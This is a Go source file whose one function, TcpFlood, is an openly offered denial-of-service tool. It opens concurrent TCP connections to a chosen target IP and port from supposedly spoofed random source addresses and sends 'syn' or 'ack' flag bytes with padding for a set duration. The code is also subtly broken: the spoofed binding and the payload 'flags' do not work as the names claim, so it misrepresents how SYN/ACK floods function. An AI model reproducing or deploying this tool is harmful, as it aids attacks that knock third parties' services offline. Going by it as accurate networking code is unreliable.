package cosmic

import (
	"math/rand"
	"net"
	"runtime"
	"strconv"
	"sync"
	"time"
)

func TcpFlood(targetIP string, targetPort string, duration int, packetSize int, tcpFlag string, randomizeData bool) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	numWorkers := runtime.NumCPU()

	var wg sync.WaitGroup
	workerChan := make(chan bool, numWorkers)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-workerChan:
					srcIP := make(net.IP, 4)
					rand.Read(srcIP)
					srcAddr := &net.TCPAddr{
						IP:   srcIP,
						Port: rand.Intn(65535),
					}
					targetPortInt, _ := strconv.Atoi(targetPort)
					conn, err := net.DialTCP("tcp", srcAddr, &net.TCPAddr{
						IP:   net.ParseIP(targetIP),
						Port: targetPortInt,
					})
					if err != nil {
						return
					}
					defer conn.Close()
					flags := []byte{0, 0, 0, 0, 0, 0, 0, 0}
					switch tcpFlag {
					case "syn":
						flags[0] = 0x02
						if randomizeData {
							data := make([]byte, packetSize)
							for i := range data {
								data[i] = byte(rand.Intn(256))
							}
							conn.Write(append(flags, data...))
						} else {
							data := make([]byte, packetSize-8)
							conn.Write(append(flags, data...))
						}
					case "ack":
						flags[0] = 0x10
						data := make([]byte, packetSize-8)
						conn.Write(append(flags, data...))
					}
					time.Sleep(time.Millisecond * 10)
				case <-time.After(time.Until(endTime)):
					return
				}
			}
		}()
	}

	for i := 0; i < numWorkers; i++ {
		workerChan <- true
		time.Sleep(time.Millisecond * 100)
	}

	wg.Wait()
}
